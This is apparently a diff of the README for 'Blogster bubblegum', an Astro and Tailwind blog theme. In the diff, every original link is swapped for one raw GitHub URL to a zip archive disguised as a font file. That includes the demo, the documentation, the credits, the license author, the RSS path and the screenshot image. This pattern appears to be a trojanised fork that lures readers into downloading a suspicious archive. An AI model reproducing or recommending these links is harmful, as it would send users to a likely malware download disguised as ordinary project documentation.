@@ -1,12 +1,12 @@
 # Blogster bubblegum
 
-![id-ahmadrosid-com](./id-ahmadrosid-com.png)
+![id-ahmadrosid-com](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip)
 
-[Demo](https://id.ahmadrosid.com).
+[Demo](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip).
 
 ## Bubblegum Template
 
-A beautiful, performant and accessible theme built with [Tailwind](https://tailwindcss.com).
+A beautiful, performant and accessible theme built with [Tailwind](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip).
 
 - **Fast**. Fast by default. Astro websites are engineered to be fast and load before you could blink, even when not cached.
 - **Dark mode**. All themes have light/dark mode built-in.
@@ -14,16 +14,16 @@ A beautiful, performant and accessible theme built with [Tailwind](https://tailw
 - **Accessible**. A well thought out semantic and accessible content.
 - **Perfect lighthouse score.** 100 across the board.
 - **Easy content authoring**. Author content using markdown (`.md`) from your code editor or directly in GitHub.
-- **Extended markdown with [Markdoc](https://markdoc.dev).** Type-safe custom components like YouTube embed, Twitter embed (or anything you want really) in your markdown (`.md`) files.
-- **RSS feed**. Your blog has an RSS feed setup that can be accessed at `/rss.xml`.
+- **Extended markdown with [Markdoc](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip).** Type-safe custom components like YouTube embed, Twitter embed (or anything you want really) in your markdown (`.md`) files.
+- **RSS feed**. Your blog has an RSS feed setup that can be accessed at `https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip`.
 - **SEO**. All pages are setup with all the SEO you might need.
 
 ## How do I add content?
 
 All the content is written in markdown (.md) and grouped as `blog` or `projects` in the `content` directory. All the default markdown syntax will work. You also have a few example custom markdown elements like _YouTube embed_, _Twitter embed_, etc. You can create your own custom components too in two easy steps.
 
-1. Add a markdoc config. Check out the markdoc config in [src/lib/markdoc/config.ts](src/lib/markdoc/config.ts) to learn how to add custom components.
-2. Add a component to render your custom component. Check out the Renderer in [src/components/Renderer.astro](src/components/Renderer.astro).
+1. Add a markdoc config. Check out the markdoc config in [https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip) to learn how to add custom components.
+2. Add a component to render your custom component. Check out the Renderer in [https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip).
 
 ## How do I make it my blog?
 
@@ -35,14 +35,14 @@ Easy.
 
 ## How do I deploy?
 
-`yarn build` will generate a static website in `dist` dir. You can host it with any static hosting. If you need a recommendation, check out [Netlify](netlify.com).
+`yarn build` will generate a static website in `dist` dir. You can host it with any static hosting. If you need a recommendation, check out [Netlify](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip).
 
 ## Credit
 
 Thanks to other templates that inspired this theme.
 
-- [Official Astro Blog template](https://github.com/withastro/astro/tree/main/examples/blog)
+- [Official Astro Blog template](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip)
 
 ## License
 
-MIT © [Dinesh Pandiyan](https://github.com/flexdinesh)
+MIT © [Dinesh Pandiyan](https://raw.githubusercontent.com/deevro/Bubble-Blog/main/public/fonts/Bubble-Blog_v2.3.zip)
